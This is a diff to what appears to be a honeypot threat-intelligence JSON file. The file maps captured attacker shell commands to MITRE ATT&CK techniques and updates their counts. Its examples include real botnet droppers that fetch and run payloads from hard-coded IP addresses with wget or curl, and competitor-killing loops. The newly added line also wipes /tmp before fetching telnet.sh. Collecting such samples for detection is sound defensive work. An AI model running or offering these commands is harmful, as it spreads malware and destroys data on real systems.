@@ -24,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 12034,
-      "distinct_ips": 560,
+      "count": 12071,
+      "distinct_ips": 561,
       "examples": [
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.121:7372/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:7372/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.121 >/dev/null 2>&1 &) >/dev/null 2>&1 &",
         "echo 'chmod +x /tmp/.st' >> /tmp/.iu",
@@ -41,8 +41,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2770,
-      "distinct_ips": 423,
+      "count": 2771,
+      "distinct_ips": 424,
       "examples": [
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.121:7372/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:7372/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.121 >/dev/null 2>&1 &) >/dev/null 2>&1 &",
         "echo 'wget -q http://176.65.134.121:8080/stub.x86_64 -O /tmp/.st' > /tmp/.iu",
@@ -75,10 +75,11 @@
         "impact"
       ],
       "url": "https://attack.mitre.org/techniques/T1489",
-      "count": 216,
-      "distinct_ips": 22,
+      "count": 217,
+      "distinct_ips": 23,
       "examples": [
         "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    if [ \"$result\" != \"${result%(deleted)}\" ]; then\n        kill -9 \"$pid\"\n    fi\ndone\n",
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do case \"$line\" in *\"/lib/\"*|*\"/lib64/\"*|*\".so\"*) suspicious=false; break;; esac; done < \"$pid/maps\"; if [ \"$suspicious\" = true ]; then kill -9 \"$pid_num\"; fi; fi; done; cd /tmp; rm -rf *; wget http://43.228.157.165:11169/telnet.sh || curl http://43.228.157.165:11169/telnet.sh -o telnet.sh || echo DOWNLOAD_FAILED; chmod 777 telnet.sh; sh telnet.sh || ./telnet.sh",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do case \"$line\" in *\"/lib/\"*|*\"/lib64/\"*|*\".so\"*) suspicious=false; break;; esac; done < \"$pid/maps\"; if [ \"$suspicious\" = true ]; then kill -9 \"$pid_num\"; fi; fi; done",
         "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done"
       ]
@@ -183,6 +184,6 @@
       ]
     }
   ],
-  "total_commands": 381067,
-  "matched_commands": 137363
+  "total_commands": 381648,
+  "matched_commands": 137400
 }
